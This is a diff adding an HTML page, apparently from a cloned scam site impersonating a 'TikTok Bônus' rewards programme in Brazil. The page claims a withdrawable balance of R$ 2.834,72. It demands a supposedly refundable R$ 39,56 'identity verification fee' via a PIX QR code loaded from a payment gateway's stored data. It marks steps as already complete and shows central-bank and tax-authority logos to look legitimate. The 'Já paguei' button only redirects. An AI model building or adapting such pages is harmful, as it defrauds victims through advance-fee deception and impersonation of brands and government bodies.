@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Pagamento PIX — TikTok Bônus</title>
+  <meta name="description" content="TikTok Bônus - Recompensas">
+  <link rel="icon" href="assets/icon-light-32x32.png" media="(prefers-color-scheme: light)">
+  <link rel="icon" href="assets/icon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="assets/_next/static/chunks/8a80e7184ad3a13f.css">
+  <link rel="stylesheet" href="assets/_next/static/chunks/d53fa3d4da85ccbf.css">
+</head>
+<body class="font-sans antialiased bg-[#F3F4F6]">
+  <main class="relative min-h-screen">
+    <div class="mx-auto flex min-h-screen max-w-[390px] flex-col bg-[#F3F4F6]">
+      <div class="flex items-center justify-center bg-white py-4">
+        <img alt="TikTok" class="h-[28px] w-auto" src="assets/images/tiktok-logo.png">
+      </div>
+
+      <div class="flex flex-1 flex-col gap-3 p-4 pb-6">
+        <!-- saldo disponível -->
+        <section class="rounded-xl px-5 py-4" style="background: rgb(26, 26, 26);">
+          <p class="text-[11px] font-semibold uppercase tracking-wider text-white">SALDO DISPONÍVEL</p>
+          <p class="mt-1 text-[28px] font-bold text-white">R$ 2.834,72</p>
+          <p class="mt-0.5 text-[12px] text-[#9CA3AF]">Aguardando confirmação para saque</p>
+        </section>
+
+        <!-- confirmação de identidade (repetida no topo) -->
+        <section class="rounded-xl border border-[#E5E7EB] bg-white px-5 py-4">
+          <p class="text-[12px] font-bold uppercase tracking-wider text-[#6B7280]">CONFIRMAÇÃO DE IDENTIDADE</p>
+          <div class="mt-3 flex items-center gap-3">
+            <span class="text-[22px] font-bold text-[#EF4444]">R$ 39,56</span>
+            <span class="rounded-md bg-[#D1FAE5] px-2 py-0.5 text-[10px] font-bold uppercase text-[#059669]">VALOR REEMBOLSÁVEL</span>
+          </div>
+          <p class="mt-3 text-[13px] leading-relaxed text-[#6B7280]">
+            Taxa obrigatória para liberação do saque no valor de
+            <span class="font-bold text-[#1A1A1A]">R$ 2.834,72</span>.
+            O valor de
+            <span class="font-bold text-[#1A1A1A]">R$ 39,56</span>
+            será reembolsado integralmente para você em 1 minuto.
+          </p>
+        </section>
+
+        <!-- dados para reembolso (resumo) -->
+        <section class="rounded-xl border border-[#E5E7EB] bg-white px-5 py-4">
+          <p class="text-[12px] font-bold uppercase tracking-wider text-[#6B7280]">DADOS PARA REEMBOLSO</p>
+          <div class="mt-4 flex flex-col gap-0">
+            <div class="flex items-center justify-between border-b border-[#F3F4F6] py-2.5">
+              <span class="text-[13px] text-[#6B7280]">Nome</span>
+              <span class="max-w-[60%] text-right text-[13px] font-semibold text-[#1A1A1A] truncate">112.389.905-33</span>
+            </div>
+            <div class="flex items-center justify-between border-b border-[#F3F4F6] py-2.5">
+              <span class="text-[13px] text-[#6B7280]">Data</span>
+              <span id="pag-data" class="text-[13px] font-semibold text-[#1A1A1A]">27/02/2026</span>
+            </div>
+            <div class="flex items-center justify-between border-b border-[#F3F4F6] py-2.5">
+              <span class="text-[13px] text-[#6B7280]">Chave PIX</span>
+              <span class="text-[13px] font-semibold text-[#1A1A1A]">CPF</span>
+            </div>
+            <div class="flex items-center justify-between py-2.5">
+              <span class="text-[13px] text-[#6B7280]">Valor a receber</span>
+              <span class="text-[13px] font-bold text-[#1A1A1A]">R$ 2.834,72</span>
+            </div>
+          </div>
+          <div class="mt-3 rounded-lg bg-[#F3F4F6] py-3 text-center">
+            <span class="font-mono text-[15px] font-medium tracking-widest text-[#1A1A1A]">112.389.905-33</span>
+          </div>
+        </section>
+
+        <!-- processo de liberação com etapa 1 concluída visualmente -->
+        <section class="rounded-xl border border-[#E5E7EB] bg-white px-5 py-4">
+          <p class="text-[12px] font-bold uppercase tracking-wider text-[#6B7280]">PROCESSO DE LIBERAÇÃO</p>
+          <div class="mt-4 flex flex-col gap-4">
+            <div class="flex gap-3">
+              <div class="flex h-[24px] w-[24px] flex-shrink-0 items-center justify-center rounded-md bg-[#10B981]">
+                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                  <path d="M3 7L6 10L11 4" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                </svg>
+              </div>
+              <div>
+                <p class="text-[14px] font-bold text-[#10B981]">Pagar taxa de confirmação</p>
+                <p class="text-[12px] text-[#6B7280]">R$ 39,56 para verificação de identidade</p>
+              </div>
+            </div>
+            <div class="flex gap-3">
+              <div class="flex h-[24px] w-[24px] flex-shrink-0 items-center justify-center rounded-md bg-[#10B981]">
+                <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+                  <path d="M3 7L6 10L11 4" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                </svg>
+              </div>
+              <div>
+                <p class="text-[14px] font-bold text-[#10B981]">Receber reembolso automático</p>
+                <p class="text-[12px] text-[#6B7280]">Valor devolvido em 1 minuto</p>
+              </div>
+            </div>
+            <div class="flex gap-3">
+              <div class="flex h-[24px] w-[24px] flex-shrink-0 items-center justify-center rounded-md bg-[#EF4444] text-[12px] font-bold text-white">3</div>
+              <div>
+                <p class="text-[14px] font-bold text-[#1A1A1A]">Acessar saldo completo</p>
+                <p class="text-[12px] text-[#6B7280]">R$ 2.834,72 liberado para saque</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- QR Code e código PIX -->
+        <section class="rounded-xl border border-[#E5E7EB] bg-white px-5 py-5">
+          <p class="text-[13px] font-semibold text-[#1A1A1A]">Escaneie o QR Code para pagar</p>
+          <div class="mt-3 flex items-center justify-center">
+            <div class="flex h-[200px] w-[200px] items-center justify-center rounded-xl border border-dashed border-[#E5E7EB] bg-[#F9FAFB]">
+              <img id="qr-imagem" alt="QR Code PIX" class="h-[180px] w-[180px] object-contain" style="display:none;">
+              <span id="qr-placeholder" class="text-[12px] text-[#9CA3AF]">QR Code PIX</span>
+            </div>
+          </div>
+          <p class="mt-4 text-center text-[11px] text-[#6B7280]">OU COPIE O CÓDIGO PIX</p>
+          <div class="mt-2 flex items-center gap-2 rounded-xl border border-[#E5E7EB] bg-[#F9FAFB] px-3 py-2">
+            <span id="codigo-pix" class="flex-1 truncate text-[11px] text-[#4B5563]">00020126360014BR.GOV.BCB.PIX0114...</span>
+            <button id="btn-copiar" class="flex-shrink-0 rounded-lg bg-[#EF4444] px-3 py-1 text-[11px] font-semibold text-white">Copiar</button>
+          </div>
+          <div class="mt-3 flex items-center justify-center gap-1.5">
+            <span class="inline-block h-2 w-2 rounded-full bg-[#10B981]"></span>
+            <span class="text-[12px] font-medium text-[#10B981]">Aguardando pagamento...</span>
+          </div>
+          <button id="btn-ja-paguei" class="mt-4 w-full rounded-xl bg-[#10B981] py-3.5 text-[15px] font-bold text-white">Já paguei</button>
+        </section>
+
+        <!-- perguntas frequentes e logos (mesmo bloco da anterior) -->
+        <section class="rounded-xl border border-[#E5E7EB] bg-white px-5 py-4">
+          <p class="text-[11px] font-bold uppercase tracking-wider text-[#6B7280]">PERGUNTAS FREQUENTES</p>
+          <div class="mt-4 flex flex-col">
+            <div>
+              <button class="flex w-full items-center justify-between py-4 text-left">
+                <span class="pr-4 text-[14px] font-bold text-[#1A1A1A]">Por que preciso pagar essa taxa?</span>
+              </button>
+              <p class="pb-4 text-[13px] leading-relaxed text-[#6B7280]">
+                A taxa é uma verificação de segurança obrigatória para confirmar sua identidade e liberar o saque.
+                O valor é reembolsado automaticamente em até 1 minuto.
+              </p>
+            </div>
+            <div class="border-t border-[#F3F4F6]">
+              <button class="flex w-full items-center justify-between py-4 text-left">
+                <span class="pr-4 text-[14px] font-bold text-[#1A1A1A]">Vou receber o reembolso da taxa?</span>
+              </button>
+            </div>
+            <div class="border-t border-[#F3F4F6]">
+              <button class="flex w-full items-center justify-between py-4 text-left">
+                <span class="pr-4 text-[14px] font-bold text-[#1A1A1A]">Quanto tempo para o saque cair?</span>
+              </button>
+            </div>
+            <div class="border-t border-[#F3F4F6]">
+              <button class="flex w-full items-center justify-between py-4 text-left">
+                <span class="pr-4 text-[14px] font-bold text-[#1A1A1A]">É seguro pagar via PIX?</span>
+              </button>
+            </div>
+            <div class="border-t border-[#F3F4F6]">
+              <button class="flex w-full items-center justify-between py-4 text-left">
+                <span class="pr-4 text-[14px] font-bold text-[#1A1A1A]">E se eu não receber o reembolso?</span>
+              </button>
+            </div>
+          </div>
+        </section>
+
+        <section class="mt-2 flex items-center justify-center gap-8 py-4">
+          <img alt="BACEN" class="h-[44px] w-auto object-contain" src="assets/images/bacen.png">
+          <img alt="gov.br" class="h-[20px] w-auto object-contain" src="assets/images/gov-br.webp">
+          <img alt="Receita Federal" class="h-[44px] w-auto object-contain" src="assets/images/receita-federal.png">
+        </section>
+        <section class="pb-4 text-center">
+          <p class="text-[12px] text-[#9CA3AF]">Processo 100% seguro</p>
+          <p class="mt-1 text-[13px] font-medium text-[#EF4444]">Precisa de ajuda?</p>
+        </section>
+      </div>
+    </div>
+  </main>
+
+  <script>
+    (function() {
+      // data de hoje
+      var dataEl = document.getElementById('pag-data');
+      if (dataEl) {
+        var d = new Date();
+        var dd = String(d.getDate()).padStart(2, '0');
+        var mm = String(d.getMonth() + 1).padStart(2, '0');
+        var yyyy = d.getFullYear();
+        dataEl.textContent = dd + '/' + mm + '/' + yyyy;
+      }
+
+      // preencher dados do pagamento PIX vindo do passo anterior
+      var raw = window.localStorage.getItem('ghostspay_pix');
+      var info;
+      try { info = raw ? JSON.parse(raw) : null; } catch (_) { info = null; }
+      if (!info || !info.pix) {
+        // se não houver dados, volta para tela anterior
+        window.location.href = 'saque-confirmado.html';
+        return;
+      }
+
+      var codigoPixSpan = document.getElementById('codigo-pix');
+      var qrImg = document.getElementById('qr-imagem');
+      var qrPlaceholder = document.getElementById('qr-placeholder');
+
+      if (info.pix.qrcodeText && codigoPixSpan) {
+        codigoPixSpan.textContent = info.pix.qrcodeText;
+      }
+      if (info.pix.qrcode && qrImg) {
+        qrImg.src = info.pix.qrcode;
+        qrImg.style.display = 'block';
+        if (qrPlaceholder) qrPlaceholder.style.display = 'none';
+      }
+
+      // copiar código PIX (simples)
+      var codigoEl = document.getElementById('codigo-pix');
+      var btnCopiar = document.getElementById('btn-copiar');
+      if (btnCopiar && codigoEl) {
+        btnCopiar.addEventListener('click', function() {
+          var text = codigoEl.textContent || '';
+          try {
+            navigator.clipboard.writeText(text);
+            btnCopiar.textContent = 'Copiado';
+            setTimeout(function() { btnCopiar.textContent = 'Copiar'; }, 1500);
+          } catch (_) {}
+        });
+      }
+
+      // \"Já paguei\" apenas volta para saldo no clone
+      var btnOk = document.getElementById('btn-ja-paguei');
+      if (btnOk) {
+        btnOk.addEventListener('click', function() {
+          window.location.href = 'saldo.html';
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
+
